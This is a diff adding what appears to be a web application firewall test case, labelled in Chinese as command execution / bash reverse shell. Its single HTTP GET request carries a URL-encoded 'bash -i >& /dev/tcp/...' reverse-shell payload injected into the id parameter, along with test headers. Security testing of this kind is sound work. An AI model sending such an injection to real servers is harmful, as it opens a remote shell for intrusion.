@@ -1,0 +1,9 @@
+# 命令执行_反弹shell-06507067
+# bash反弹shell
+GET /?id=bash%20-i%20%3E&%20%2Fdev%2Ftcp%2F10.0.0.1%2F8080%200%3E&1&bid=hd_tag_m8mv25z8 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25z8
+RM-PRO-Token: 96bd56b8eb9fbab438c6b7b235fc0655
+RM-PRO-Time: 1742808515529
+User-Agent: curl/7.83.1
+
